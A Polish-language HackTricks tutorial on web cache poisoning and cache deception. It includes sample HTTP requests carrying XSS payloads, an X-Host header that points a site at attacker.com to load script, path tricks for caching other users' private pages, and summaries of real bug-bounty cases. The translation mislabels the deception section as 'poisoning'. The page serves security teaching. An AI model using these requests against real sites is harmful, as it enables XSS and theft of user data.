# Zatrucie pamięci podręcznej i Oszustwo pamięci podręcznej

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception), aby łatwo tworzyć i **automatyzować przepływy pracy** z wykorzystaniem **najbardziej zaawansowanych** narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

## Różnica

> **Jaka jest różnica między zatruciem pamięci podręcznej sieci web a oszustwem pamięci podręcznej sieci web?**
>
> * W **zatruciu pamięci podręcznej sieci web**, atakujący powoduje, że aplikacja przechowuje pewne złośliwe treści w pamięci podręcznej, a te treści są serwowane z pamięci podręcznej innym użytkownikom aplikacji.
> * W **oszustwie pamięci podręcznej sieci web**, atakujący powoduje, że aplikacja przechowuje pewne wrażliwe treści należące do innego użytkownika w pamięci podręcznej, a następnie atakujący odzyskuje te treści z pamięci podręcznej.

## Zatrucie pamięci podręcznej

Zatrucie pamięci podręcznej ma na celu manipulowanie pamięcią podręczną po stronie klienta, aby zmusić klientów do ładowania zasobów, które są nieoczekiwane, częściowe lub pod kontrolą atakującego. Wielkość wpływu zależy od popularności dotkniętej strony, ponieważ skażona odpowiedź jest serwowana wyłącznie użytkownikom odwiedzającym stronę podczas okresu zanieczyszczenia pamięci podręcznej.

Wykonanie ataku zatrucia pamięci podręcznej obejmuje kilka kroków:

1. **Identyfikacja wejść bez klucza**: Są to parametry, które, chociaż nie są wymagane do przechowywania żądania w pamięci podręcznej, mogą zmienić odpowiedź zwróconą przez serwer. Identyfikacja tych wejść jest kluczowa, ponieważ mogą być wykorzystane do manipulowania pamięcią podręczną.
2. **Wykorzystanie wejść bez klucza**: Po zidentyfikowaniu wejść bez klucza, następny krok polega na zrozumieniu, jak wykorzystać te parametry do zmodyfikowania odpowiedzi serwera w sposób korzystny dla atakującego.
3. **Zapewnienie, że zatruta odpowiedź jest przechowywana w pamięci podręcznej**: Ostatnim krokiem jest zapewnienie, że zmodyfikowana odpowiedź jest przechowywana w pamięci podręcznej. W ten sposób każdy użytkownik odwiedzający dotkniętą stronę podczas zatrucia pamięci podręcznej otrzyma skażoną odpowiedź.

### Odkrywanie: Sprawdź nagłówki HTTP

Zazwyczaj, gdy odpowiedź została **przechowana w pamięci podręcznej**, będzie to **nagłówek wskazujący na to**, możesz sprawdzić, na które nagłówki powinieneś zwrócić uwagę w tym poście: [**Nagłówki pamięci podręcznej HTTP**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Odkrywanie: Kody błędów pamięci podręcznej

Jeśli podejrzewasz, że odpowiedź jest przechowywana w pamięci podręcznej, możesz spróbować **wysłać żądania z nieprawidłowym nagłówkiem**, na które powinno być odpowiedzią **kod stanu 400**. Następnie spróbuj uzyskać dostęp do żądania normalnie, a jeśli **odpowiedź to kod stanu 400**, wiesz, że jest podatne (i nawet możesz przeprowadzić atak typu DoS).

Możesz znaleźć więcej opcji w:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Jednak zauważ, że **czasami tego rodzaju kody stanu nie są przechowywane w pamięci podręcznej**, więc ten test może nie być niezawodny.

### Odkrywanie: Identyfikacja i ocena wejść bez klucza

Możesz użyć [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943), aby **siłowo testować parametry i nagłówki**, które mogą **zmieniać odpowiedź strony**. Na przykład strona może używać nagłówka `X-Forwarded-For`, aby wskazać klientowi, skąd ma załadować skrypt:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Wywołaj szkodliwą odpowiedź z serwera back-end

Po zidentyfikowaniu parametru/nagłówka sprawdź, w jaki sposób jest **oczyszczany** i **gdzie** jest **odzwierciedlany** lub wpływa na odpowiedź z nagłówka. Czy można go nadużyć w jakiś sposób (wykonać XSS lub załadować kod JS kontrolowany przez ciebie? przeprowadzić atak DoS?...)

### Pobierz odpowiedź z pamięci podręcznej

Gdy zidentyfikujesz **stronę**, która może być nadużyta, który **parametr/nagłówek** należy użyć i **jak** go **nadużyć**, musisz spowodować, aby strona została zapisana w pamięci podręcznej. W zależności od zasobu, który próbujesz umieścić w pamięci podręcznej, może to zająć trochę czasu, możliwe, że będziesz musiał próbować przez kilka sekund.\
Nagłówek **`X-Cache`** w odpowiedzi może być bardzo przydatny, ponieważ może mieć wartość **`miss`**, gdy żądanie nie było zapisane w pamięci podręcznej, i wartość **`hit`**, gdy jest zapisane w pamięci podręcznej.\
Nagłówek **`Cache-Control`** jest również interesujący, aby dowiedzieć się, czy zasób jest przechowywany w pamięci podręcznej i kiedy nastąpi ponowne zapisanie zasobu: `Cache-Control: public, max-age=1800`\
Kolejny interesujący nagłówek to **`Vary`**. Ten nagłówek jest często używany do **wskazania dodatkowych nagłówków**, które są traktowane jako **część klucza pamięci podręcznej**, nawet jeśli zazwyczaj nie są kluczowe. Dlatego jeśli użytkownik zna `User-Agent` ofiary, którą celuje, może zatruć pamięć podręczną dla użytkowników korzystających z tego konkretnego `User-Agent`.\
Jeszcze jeden nagłówek związany z pamięcią podręczną to **`Age`**. Określa on czas w sekundach, przez jaki obiekt znajduje się w pamięci podręcznej proxy.

Podczas umieszczania żądania w pamięci podręcznej, bądź **ostrożny z używanymi nagłówkami**, ponieważ niektóre z nich mogą być **używane w niespodziewany sposób** jako **kluczowe**, a **ofiara będzie musiała użyć tego samego nagłówka**. Zawsze **testuj** zatruwanie pamięci podręcznej **za pomocą różnych przeglądarek**, aby sprawdzić, czy działa.

## Przykłady Wykorzystania

### Najprostszy przykład

Nagłówek taki jak `X-Forwarded-For` jest odbijany w odpowiedzi w niesanitarny sposób.\
Możesz wysłać podstawowy ładunek XSS i zatruć pamięć podręczną, dzięki czemu każdy, kto uzyskuje dostęp do strony, zostanie poddany atakowi XSS:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Należy pamiętać, że to zatruje żądanie do `/en?region=uk`, a nie do `/en`_

### Zatrucie pamięci podręcznej w celu DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Wykorzystanie zatrucia pamięci podręcznej do wykorzystania podatności związanych z obsługą plików cookie

Pliki cookie mogą również być odzwierciedlane w odpowiedzi strony. Jeśli można je wykorzystać do spowodowania ataku XSS, na przykład, można wykorzystać XSS w kilku klientach, które wczytują złośliwą odpowiedź z pamięci podręcznej.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Zauważ, że jeśli podatne ciasteczko jest bardzo często używane przez użytkowników, regularne żądania będą czyścić pamięć podręczną.

### Zatrucie pamięci podręcznej z wykorzystaniem wędrówki ścieżką w celu kradzieży klucza API <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Ten opis wyjaśnia**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) jak było możliwe skradnięcie klucza API OpenAI za pomocą adresu URL takiego jak `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`, ponieważ wszystko pasujące do `/share/*` będzie przechowywane w pamięci podręcznej bez normalizacji adresu URL przez Cloudflare, co zostało zrobione, gdy żądanie dotarło do serwera internetowego.

### Wykorzystanie wielu nagłówków do eksploatacji podatności na zatrucie pamięci podręcznej w sieci <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Czasami będziesz musiał **wykorzystać kilka niezaindeksowanych wejść**, aby móc nadużyć pamięć podręczną. Na przykład, możesz znaleźć **otwarte przekierowanie** jeśli ustawisz `X-Forwarded-Host` na domenę kontrolowaną przez ciebie i `X-Forwarded-Scheme` na `http`. **Jeśli** **serwer** przekierowuje wszystkie **żądania HTTP** na HTTPS i używa nagłówka `X-Forwarded-Scheme` jako nazwy domeny dla przekierowania. Możesz kontrolować, gdzie strona jest kierowana przez przekierowanie.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Wykorzystywanie ograniczonego nagłówka `Vary`

Jeśli odkryjesz, że nagłówek **`X-Host`** jest używany jako **nazwa domeny do ładowania zasobu JS**, ale nagłówek **`Vary`** w odpowiedzi wskazuje na **`User-Agent`**. Następnie musisz znaleźć sposób na wydobyć User-Agent ofiary i zatruć pamięć podręczną, używając tego identyfikatora użytkownika:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Wysyłamy żądanie GET z żądaniem w adresie URL i w ciele. Jeśli serwer internetowy używa tego z ciała, ale serwer pamięci podręcznej przechowuje ten z adresu URL, każdy mający dostęp do tego adresu URL będzie faktycznie używał parametru z ciała. Podobnie jak znalazł to James Kettle na stronie internetowej Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
### Ukrywanie parametrów

Na przykład w serwerach ruby można oddzielić **parametry** używając znaku **`;`** zamiast **`&`**. Można to wykorzystać do umieszczenia wartości parametrów bez klucza wewnątrz tych z kluczem i nadużyć ich.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Wykorzystanie zatrucia pamięci podręcznej HTTP poprzez nadużycie Przesyłania Żądań HTTP

Dowiedz się tutaj, jak przeprowadzić ataki na pamięć podręczną [Zatrucia Pamięci Podręcznej poprzez nadużycie Przesyłania Żądań HTTP](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automatyczne testowanie Zatrucia Pamięci Podręcznej Sieci Web

Skaner podatności pamięci podręcznej sieci Web ([Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)) może być użyty do automatycznego testowania zatrucia pamięci podręcznej sieci Web. Obsługuje wiele różnych technik i jest bardzo konfigurowalny.

Przykładowe użycie: `wcvs -u example.com`



<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception), aby łatwo tworzyć i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społeczności na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}



## Przykłady podatności

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS przekazywał fragment wewnątrz adresu URL bez usuwania go i generował klucz pamięci podręcznej tylko przy użyciu hosta, ścieżki i zapytania (ignorując fragment). Dlatego żądanie `/#/../?r=javascript:alert(1)` zostało wysłane do backendu jako `/#/../?r=javascript:alert(1)` i klucz pamięci podręcznej nie zawierał ładunku wewnątrz niego, tylko hosta, ścieżkę i zapytanie.

### GitHub CP-DoS

Wysłanie złej wartości w nagłówku content-type wywołało odpowiedź z kodem 405 z pamięci podręcznej. Klucz pamięci podręcznej zawierał ciasteczko, więc możliwe było atakowanie tylko nieuwierzytelnionych użytkowników.

### GitLab + GCP CP-DoS

GitLab używa kubełków GCP do przechowywania statycznych treści. **Kubełki GCP** obsługują nagłówek `x-http-method-override`. Dlatego było możliwe wysłanie nagłówka `x-http-method-override: HEAD` i zatrucie pamięci podręcznej, aby zwróciła pusty ciało odpowiedzi. Mogło to również obsługiwać metodę `PURGE`.

### Rack Middleware (Ruby on Rails)

W aplikacjach Ruby on Rails często wykorzystuje się pośredniki Rack. Kod Rack ma na celu pobranie wartości nagłówka **`x-forwarded-scheme`** i ustawienie jej jako schematu żądania. Gdy wysłany jest nagłówek `x-forwarded-scheme: http`, następuje przekierowanie 301 do tej samej lokalizacji, co potencjalnie może spowodować odmowę usługi (DoS) dla tego zasobu. Dodatkowo aplikacja może uwzględniać nagłówek `X-forwarded-host` i przekierowywać użytkowników pod wskazany host. To zachowanie może prowadzić do ładowania plików JavaScript z serwera atakującego, stanowiąc ryzyko dla bezpieczeństwa.

### 403 i Kubełki Przechowywania

Cloudflare wcześniej pamiętał odpowiedzi 403. Próba dostępu do zasobów S3 lub Azure Storage Blobs z nieprawidłowymi nagłówkami autoryzacji skutkowała odpowiedzią 403, która została zapisana w pamięci podręcznej. Chociaż Cloudflare zaprzestał pamiętania odpowiedzi 403, to zachowanie to może nadal występować w innych usługach proxy.

### Wstrzykiwanie Parametrów z Kluczem

Pamięci podręczne często zawierają określone parametry GET w kluczu pamięci podręcznej. Na przykład Varnish Fastly pamiętał parametr `size` w żądaniach. Jednak jeśli została również wysłana zdekodowana wersja parametru (np. `siz%65`) z błędną wartością, klucz pamięci podręcznej był konstruowany przy użyciu poprawnego parametru `size`. Jednak backend przetwarzał wartość w parametrze zdekodowanym z adresu URL. Zdekodowanie drugiego parametru `size` prowadziło do jego pominięcia przez pamięć podręczną, ale jego wykorzystania przez backend. Przypisanie wartości 0 do tego parametru skutkowało zapisaniem błędu 400 Bad Request w pamięci podręcznej.

### Reguły Użytkownika Agent

Niektórzy programiści blokują żądania z agentami użytkownika pasującymi do tych z narzędzi o dużym ruchu, takich jak FFUF lub Nuclei, aby zarządzać obciążeniem serwera. Ironicznie, ten sposób postępowania może wprowadzić podatności, takie jak zatrucie pamięci podręcznej i DoS.

### Nielegalne Pola Nagłówka

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) określa akceptowalne znaki w nazwach nagłówków. Nagłówki zawierające znaki spoza określonego zakresu **tchar** powinny idealnie wywoływać odpowiedź 400 Bad Request. W praktyce serwery nie zawsze przestrzegają tego standardu. Przykładem jest Akamai, który przekazuje nagłówki z nieprawidłowymi znakami i pamięta każdy błąd 400, o ile nagłówek `cache-control` nie jest obecny. Zidentyfikowano wzorzec podatny na eksploatację, gdzie wysłanie nagłówka z nielegalnym znakiem, takim jak `\`, skutkował zapisaniem błędu 400 Bad Request w pamięci podręcznej.

### Znajdowanie nowych nagłówków

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Zatrucie Pamięci Podręcznej

Celem Zatrucia Pamięci Podręcznej jest sprawienie, aby klienci **ładowali zasoby, które zostaną zapisane przez pamięć podręczną wraz z ich wrażliwymi informacjami**.

Po pierwsze zauważ, że **rozszerzenia** takie jak `.css`, `.js`, `.png` itp. są zazwyczaj **skonfigurowane** do **zapisywania** w **pamięci podręcznej**. Dlatego jeśli uzyskasz dostęp do `www.example.com/profile.php/nonexistent.js`, pamięć podręczna prawdopodobnie zapisze odpowiedź, ponieważ widzi rozszerzenie `.js`. Jednak jeśli **aplikacja** odtwarza **wrażliwe** treści użytkownika przechowywane w _www.example.com/profile.php_, możesz **ukraść** te treści od innych użytkowników.

Inne rzeczy do przetestowania:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Użyj mniej znanych rozszerzeń, takich jak_ `.avif`

Bardzo jasny przykład można znaleźć w tym opisie: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
W przykładzie wyjaśniono, że jeśli załadujesz nieistniejącą stronę, np. _http://www.example.com/home.php/non-existent.css_, zawartość _http://www.example.com/home.php_ (**z wrażliwymi informacjami użytkownika**) zostanie zwrócona, a serwer pamięci podręcznej zapisze wynik.\
Następnie **atakujący** może uzyskać dostęp do _http://www.example.com/home.php/non-existent.css_ w swojej przeglądarce i obserwować **poufne informacje** użytkowników, którzy mieli dostęp wcześniej.

Zauważ, że **serwer proxy pamięci podręcznej** powinien być **skonfigurowany** do **przechowywania** plików **na podstawie** rozszerzenia pliku (_.css_) i nie na podstawie typu zawartości. W przykładzie _http://www.example.com/home.php/non-existent.css_ będzie miało typ zawartości `text/html` zamiast oczekiwanego typu mime `text/css` (który jest oczekiwany dla pliku _.css_).

Dowiedz się tutaj, jak przeprowadzić [Ataki Zatrucia Pamięci Podręcznej, nadużywając Przesyłania Żądań HTTP](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).
## Automatyczne narzędzia

* [**toxicache**](https://github.com/xhzeem/toxicache): Skaner napisany w języku Golang do znajdowania podatności na zatrucie pamięci podręcznej sieci web w liście adresów URL oraz testowania wielu technik wstrzykiwania.

## Odnośniki

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności na świecie.\
Zdobądź dostęp już dziś:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

<details>

<summary><strong>Zacznij od zera i zostań ekspertem w hakowaniu AWS z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
